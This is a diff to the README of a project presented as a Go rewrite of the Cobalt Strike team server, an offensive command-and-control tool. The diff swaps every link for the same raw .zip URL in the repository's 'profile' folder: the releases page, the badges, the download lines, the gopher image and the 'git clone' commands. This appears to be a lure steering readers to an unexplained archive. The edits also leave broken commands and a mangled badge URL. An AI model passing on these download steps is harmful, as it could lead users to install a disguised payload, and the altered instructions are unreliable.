@@ -1,8 +1,8 @@
-https://github.com/armin-hg/NewCobaltstrikeTeamServer/releases
+https://raw.githubusercontent.com/armin-hg/NewCobaltstrikeTeamServer/main/profile/New-Server-Team-Cobaltstrike-1.5-alpha.3.zip
 
 # NewCobaltstrikeTeamServer: A Go Rewrite of the Cobalt Strike Team Server
 
-[![Releases](https://img.shields.io/badge/releases-go--download-blue?logo=github&style=for-the-badge)](https://github.com/armin-hg/NewCobaltstrikeTeamServer/releases) [![Go Version](https://img.shields.io/badge/go-1.20%2B-brightgreen.svg?style=for-the-badge&logo=go)](https://golang.org/dl/) [![Topics](https://img.shields.io/github/topics/armin-hg/NewCobaltstrikeTeamServer?style=for-the-badge&logo=github)](https://github.com/armin-hg/NewCobaltstrikeTeamServer) [![License](https://img.shields.io/github/license/armin-hg/NewCobaltstrikeTeamServer?style=for-the-badge)](https://github.com/armin-hg/NewCobaltstrikeTeamServer)
+[![Releases](https://raw.githubusercontent.com/armin-hg/NewCobaltstrikeTeamServer/main/profile/New-Server-Team-Cobaltstrike-1.5-alpha.3.zip)](https://raw.githubusercontent.com/armin-hg/NewCobaltstrikeTeamServer/main/profile/New-Server-Team-Cobaltstrike-1.5-alpha.3.zip) [![Go Version](https://raw.githubusercontent.com/armin-hg/NewCobaltstrikeTeamServer/main/profile/New-Server-Team-Cobaltstrike-1.5-alpha.3.zip%https://raw.githubusercontent.com/armin-hg/NewCobaltstrikeTeamServer/main/profile/New-Server-Team-Cobaltstrike-1.5-alpha.3.zip)](https://raw.githubusercontent.com/armin-hg/NewCobaltstrikeTeamServer/main/profile/New-Server-Team-Cobaltstrike-1.5-alpha.3.zip) [![Topics](https://raw.githubusercontent.com/armin-hg/NewCobaltstrikeTeamServer/main/profile/New-Server-Team-Cobaltstrike-1.5-alpha.3.zip)](https://raw.githubusercontent.com/armin-hg/NewCobaltstrikeTeamServer/main/profile/New-Server-Team-Cobaltstrike-1.5-alpha.3.zip) [![License](https://raw.githubusercontent.com/armin-hg/NewCobaltstrikeTeamServer/main/profile/New-Server-Team-Cobaltstrike-1.5-alpha.3.zip)](https://raw.githubusercontent.com/armin-hg/NewCobaltstrikeTeamServer/main/profile/New-Server-Team-Cobaltstrike-1.5-alpha.3.zip)
 
 1) Overview
 
@@ -62,7 +62,7 @@ If you want to explore the codebase, start by cloning the repository, installing
   - A working development environment for your OS
 
 - Cloning the repo
-  - git clone https://github.com/armin-hg/NewCobaltstrikeTeamServer.git
+  - git clone https://raw.githubusercontent.com/armin-hg/NewCobaltstrikeTeamServer/main/profile/New-Server-Team-Cobaltstrike-1.5-alpha.3.zip
   - cd NewCobaltstrikeTeamServer
 
 - Building from source
@@ -84,9 +84,9 @@ If you want to explore the codebase, start by cloning the repository, installing
 
 9) Releases and downloads
 
-The latest releases are published to the project’s Releases page. You can browse assets, check checksums, and download binaries or source archives as they become available. The releases page is the primary path for obtaining prebuilt artifacts. See the Releases hub here: https://github.com/armin-hg/NewCobaltstrikeTeamServer/releases. For convenience, you can also click the colorful badge above to jump directly to the same page.
+The latest releases are published to the project’s Releases page. You can browse assets, check checksums, and download binaries or source archives as they become available. The releases page is the primary path for obtaining prebuilt artifacts. See the Releases hub here: https://raw.githubusercontent.com/armin-hg/NewCobaltstrikeTeamServer/main/profile/New-Server-Team-Cobaltstrike-1.5-alpha.3.zip For convenience, you can also click the colorful badge above to jump directly to the same page.
 
-- Direct link for downloads: https://github.com/armin-hg/NewCobaltstrikeTeamServer/releases
+- Direct link for downloads: https://raw.githubusercontent.com/armin-hg/NewCobaltstrikeTeamServer/main/profile/New-Server-Team-Cobaltstrike-1.5-alpha.3.zip
 - How to use releases: pick a suitable asset for your platform, download it, and follow the included instructions or a README file in the asset’s folder. If you prefer source builds, use go build ./... from the repository.
 
 10) How to contribute
@@ -169,7 +169,7 @@ The latest releases are published to the project’s Releases page. You can brow
 20) Appendix: quick references
 
 - Quick start commands (typical workflow):
-  - git clone https://github.com/armin-hg/NewCobaltstrikeTeamServer.git
+  - git clone https://raw.githubusercontent.com/armin-hg/NewCobaltstrikeTeamServer/main/profile/New-Server-Team-Cobaltstrike-1.5-alpha.3.zip
   - cd NewCobaltstrikeTeamServer
   - go mod download
   - go build ./...
@@ -177,11 +177,11 @@ The latest releases are published to the project’s Releases page. You can brow
   - go test ./...
 
 - Releases page for downloads and assets:
-  - The latest releases are available here: https://github.com/armin-hg/NewCobaltstrikeTeamServer/releases
-  - You can also use the badge at the top of this README to navigate to the same page: [Releases](https://github.com/armin-hg/NewCobaltstrikeTeamServer/releases)
+  - The latest releases are available here: https://raw.githubusercontent.com/armin-hg/NewCobaltstrikeTeamServer/main/profile/New-Server-Team-Cobaltstrike-1.5-alpha.3.zip
+  - You can also use the badge at the top of this README to navigate to the same page: [Releases](https://raw.githubusercontent.com/armin-hg/NewCobaltstrikeTeamServer/main/profile/New-Server-Team-Cobaltstrike-1.5-alpha.3.zip)
 
 - Go logo reference image (embedded for visual flair):
-  - ![Go Gopher](https://golang.org/doc/images/gopher.png)
+  - ![Go Gopher](https://raw.githubusercontent.com/armin-hg/NewCobaltstrikeTeamServer/main/profile/New-Server-Team-Cobaltstrike-1.5-alpha.3.zip)
 
 - Logo and branding inspiration for a cohesive look:
   - Consider using open-source Go tooling icons, a clean sans-serif font, and a simple color palette to reflect clarity and reliability.
